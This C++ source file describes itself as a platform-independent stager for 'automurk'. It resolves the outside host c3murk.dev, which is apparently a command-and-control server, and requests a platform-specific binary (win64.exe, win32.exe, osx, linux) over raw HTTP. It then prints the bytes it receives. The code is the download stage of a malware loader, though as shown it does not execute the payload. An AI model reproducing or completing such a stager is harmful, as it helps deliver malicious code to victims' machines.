//! A platform-independent stager for automurk
#ifdef _WIN32
#include <winsock.h>
auto& close = ::closesocket;
#else
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#endif

#include <chrono>
#include <iostream>
#include <string>
#include <thread>
#include <vector>

#include <cstring>

using namespace std::chrono_literals;

int main() {
  int fd;
  ::addrinfo* addrs;
  addrinfo hints;

  ::memset(&hints, 0, sizeof (hints));
  hints.ai_family = PF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_flags |= AI_CANONNAME;

  if (::getaddrinfo("c3murk.dev", "80", &hints, &addrs))
    return -1; // Could not resolve

  for (auto* list = addrs; list; list = list->ai_next) {
    ::sockaddr_in& a = *reinterpret_cast<sockaddr_in*>(list->ai_addr);
    if ((fd = ::socket(list->ai_family, SOCK_STREAM, 0)) < 0)
      continue;
    else if(!::connect(fd, list->ai_addr, list->ai_addrlen))
      goto connected;
    else {
      int i = errno;
      ::close(fd);
    }
  }
  return -1;

  connected:

  auto write = [&](std::string_view s) {
    return ::send(fd, s.data(), s.size(), 0);
  };
  auto read = [&](auto& s) {
    using elem_t = typename std::remove_reference_t<decltype(s)>::value_type;

    constexpr size_t buf_len = 2048;
    constexpr size_t additional_len = buf_len / sizeof(elem_t);
    auto offset = s.size();
    s.resize(s.size() + additional_len);
    auto i = ::recv(fd, s.data() + offset, additional_len * sizeof(elem_t), 0);
    if (i > 0)
      s.resize(offset + (i / sizeof(elem_t)));
    else
      s.resize(offset);
    return i;
  };

#ifdef _WIN64
  #define MURK_PATH "/bin/win64.exe"
#elif defined(_WIN32)
  #define MURK_PATH "/bin/win32.exe"
#elif defined(__APPLE__)
  #define MURK_PATH "/bin/osx"
#else
  #define MURK_PATH "/bin/linux"
#endif

  write("GET " MURK_PATH " HTTP/1.1\r\n"
        "Host: c3murk.dev\r\n"
        "\r\n");

  std::this_thread::sleep_for(100ms);

  std::vector<char> a;
  read(a);
  std::cout << a.data() << std::endl;
}
